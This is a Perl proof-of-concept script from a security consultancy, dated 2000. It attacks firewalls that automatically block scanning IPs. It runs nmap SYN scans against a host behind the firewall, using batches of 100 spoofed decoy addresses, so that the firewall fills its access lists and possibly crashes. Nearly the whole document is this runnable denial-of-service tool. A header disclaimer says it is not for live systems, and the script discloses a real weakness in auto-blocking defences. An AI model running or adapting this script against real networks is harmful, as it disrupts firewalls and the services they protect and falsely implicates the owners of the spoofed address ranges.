#!/usr/bin/perl

# PERL script to possibly kill firewall systems that actively block IP
# numbers if the system detects that the IP is scanning more than 20 ports
# on a network behind the firewall.  Works by basically creating a lot of
# decoys with nmap. Router/firewall will try to block all the (decoyed) IP
# numbers, eventually running out of access list/packetfilters, and possibly
# crashing, or overwriting access lists. Make sure your target is a machine
# behind the firewall. Requires nmap.

# This is a proof of concept code - not to be used on live systems.
# Standard disclaimer etc..
# Roelof Temmingh 2000/10/20
# roelof@sensepost.com http://www.sensepost.com

if ($#ARGV != 0) {die "usage: decoyblues target_behind_firewall\n";}

my $target=@ARGV[0];
my $passed;

sub gonmapactive
{
 $passed=@_[0];
 # add my IP right at the end of it all
 $passed=$passed."ME";
 system "nmap -T Aggressive -D $passed -sS $target -p 20-40\n";
}

$count=0;
for ($a=1; $a<255; $a++){
 for ($b=1; $b<255; $b++){
  $count++;
  $add=$add."196.$a.$b.1,";
  # when we got a 100 decoys, ship it off to nmap
  if ($count==100) {
   &gonmapactive($add);
   $add="";
   $count=0;
  }
 }
}
# Spidermark: sensepostdata

------------------------------------------------------
Roelof W Temmingh		SensePost IT security
roelof@sensepost.com		+27 83 448 6996
		http://www.sensepost.com		

